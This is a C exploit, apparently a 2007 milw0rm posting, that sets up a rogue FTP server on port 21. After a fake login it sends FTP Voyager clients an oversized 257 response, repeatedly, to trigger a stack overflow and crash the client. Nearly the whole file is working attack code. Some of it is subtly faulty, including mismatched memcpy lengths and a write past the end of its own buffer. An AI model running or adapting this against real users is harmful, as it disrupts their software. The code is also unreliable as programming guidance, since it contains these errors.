/***********************************************************************************
*               FTP Voyager <= 14.0.0.3 CWD Remote Stack Overflow                  *
*                                                                                  *
*                                                                                  *
* There is a remote stack overflow in FTP Voyager triggered by a long 257 response *
* After that, if the user hits <abort>.....................................B O O M *
*                                                                                  *
* Only a DoS, I dont think code execution is possible                              *
*                                                                                  *
* Have Fun!                                                                        *
*                                                                                  *
* Coded by Marsu <Marsupilamipowa@hotmail.fr>                                      *
***********************************************************************************/



#include "winsock2.h"
#include "stdio.h"
#include "stdlib.h"
#include "windows.h"
#pragma comment(lib, "ws2_32.lib")

int main(int argc, char* argv[])
{
	char recvbuff[1024];
	char evilbuff[30000];
	sockaddr_in sin;
	int server,client;
	WSADATA wsaData;
	WSAStartup(MAKEWORD(1,1), &wsaData);

	server = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	sin.sin_family = PF_INET;
	sin.sin_addr.s_addr = htonl(INADDR_ANY);
	sin.sin_port = htons( 21 );
	bind(server,(SOCKADDR*)&sin,sizeof(sin));
	printf("[+] FTP Voyager 14.0.0.3 CWD Remote Stack Overflow\n");
	printf("[+] Coded and discovered by Marsu <Marsupilamipowa@hotmail.fr>\n");
	printf("[*] Listening on port 21 ...\n");
	listen(server,5);
	printf("[*] Waiting for client ...\n");
	client=accept(server,NULL,NULL);
	printf("[+] Client connected\n");


	memcpy(evilbuff,"220 Hello there\r\n\0",18);
	memset(recvbuff,'\0',1024);

	if (send(client,evilbuff,strlen(evilbuff),0)==-1)
	{
		printf("[-] Error in send!\n");
		exit(-1);
	}

	//USER
	recv(client,recvbuff,1024,0);
	printf("%s", recvbuff);
	memcpy(evilbuff,"331 \r\n\0",7);
	send(client,evilbuff,strlen(evilbuff),0);
	Sleep(50);

	//PASS
	recv(client,recvbuff,1024,0);
	printf("%s", recvbuff);
	memcpy(evilbuff,"230 \r\n\0",7);
	send(client,evilbuff,strlen(evilbuff),0);

	//SYST 
	memset(recvbuff,'\0',1024);
	recv(client,recvbuff,1024,0);
	printf("%s", recvbuff);
	memcpy(evilbuff,"215 WINDOWS\r\n\0",14);
	send(client,evilbuff,strlen(evilbuff),0);

	//FEAT
	recv(client,recvbuff,1024,0);
	printf("%s", recvbuff);
	memcpy(evilbuff,"211 END\r\n\0",10);
	send(client,evilbuff,strlen(evilbuff),0);
	
	//REST 100
	recv(client,recvbuff,1024,0);
	printf("%s", recvbuff);
	memcpy(evilbuff,"350 rest at 100\r\n\0",10);
	send(client,evilbuff,strlen(evilbuff),0);
	
	//REST 0
	memset(recvbuff,'\0',1024);
	recv(client,recvbuff,1024,0);
	printf("%s", recvbuff);
	memcpy(evilbuff,"350 rest at 0\r\n\0",10);
	send(client,evilbuff,strlen(evilbuff),0);

	//PWD
	int i=5;
	memset(recvbuff,'\0',1024);
	recv(client,recvbuff,1024,0);
	printf("%s", recvbuff);
	while (i<30000) { //17000 should be enough... but chances are it is still alive =D
		memset(evilbuff+i,'a',1);
		i++;
		memset(evilbuff+i,'//',1);
		i++;
	}
	memcpy(evilbuff,"257 \"",5);
	memcpy(evilbuff+30000,"\"\r\n\0",4);
	printf("[+] Wait til the user hits <abort>");
	while(1) { //stupid loop to force the user to click disconnect. Theorically, one shot is sufficient to make the app unstable.
		if (send(client,evilbuff,strlen(evilbuff),0)==-1) break;
		Sleep(3000);
	}
	closesocket(client);
	closesocket(server);

	printf("\n[+] VoyagerFTP is DoSed\n");
	return 0;
}

// milw0rm.com [2007-02-20]
